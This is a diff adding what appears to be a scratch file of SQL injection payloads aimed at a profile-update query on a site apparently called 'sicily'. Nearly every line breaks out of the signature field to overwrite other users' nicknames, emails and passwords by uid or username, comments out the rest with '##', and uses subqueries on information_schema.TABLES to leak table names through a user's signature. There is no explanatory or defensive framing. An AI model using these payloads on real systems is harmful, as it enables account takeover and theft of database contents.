@@ -1,0 +1,31 @@
+update user set nickname='',signature=''where uid=18671;update user set nickname='',signature='
+
+
+absdc',nickname='sd' where uid=18672 ##
+
+
+ee',nickname='',email='111111111@qq.com',phone='',address='',cn_name='',en_name='',gender='',major='',grade='',class='',student_id='' where uid=18671 ##
+
+sig',nickname='nick',email='111111111@qq.com',phone='12',address='',cn_name='',en_name='',gender='',major='',grade='',class='',student_id='' where uid=18671 ##
+
+18672
+sig',nickname='nick',email='111111111@qq.com',phone='12',address='',cn_name='',en_name='',gender='',major='',grade='',class='',student_id='',password='abc' where uid=18671;##
+
+hongy9
+
+sig',nickname='nick',email='111111111@qq.com',phone='12',address='',cn_name='',en_name='',gender='',major='',grade='',class='',student_id='',password='123' where uid=18672;##
+' where lower(username)='';##
+8',password='' where lower(username)='test852';##
+sdf2',pass='abc' where username='test741';##
+
+
+.sdf2' where username=(select 'test741' from problems);##
+select count(*) from  information_schema.TABLES
+
+.sdf2' where username=(select count(*) from  information_schema.TABLES where TABLE_SCHEMA='sicily');##
+
+.sdf2',signature='13' where username='test741';##
+select TABLE_NAME from  information_schema.TABLES where TABLE_SCHEMA='eric' limit 1;
+
+
+.sdf2',signature=(select TABLE_NAME from  information_schema.TABLES where TABLE_SCHEMA='sicily' limit 1) where username='test741';##
